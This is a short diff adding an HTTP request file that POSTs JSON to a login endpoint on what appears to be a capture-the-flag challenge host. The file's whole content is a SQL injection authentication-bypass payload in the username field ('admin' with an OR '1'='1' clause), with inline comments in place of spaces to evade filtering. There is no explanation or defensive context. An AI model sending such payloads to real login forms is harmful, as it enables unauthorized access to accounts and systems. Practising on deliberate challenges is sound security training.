@@ -1,0 +1,10 @@
+@url = https://chal53-jhsdfs2.vercel.app/login
+
+POST {{url}} HTTP/1.1
+Content-Type: application/json
+
+{
+  "username": "admin'/**/OR/**/'1'='1"
+}
+
+###
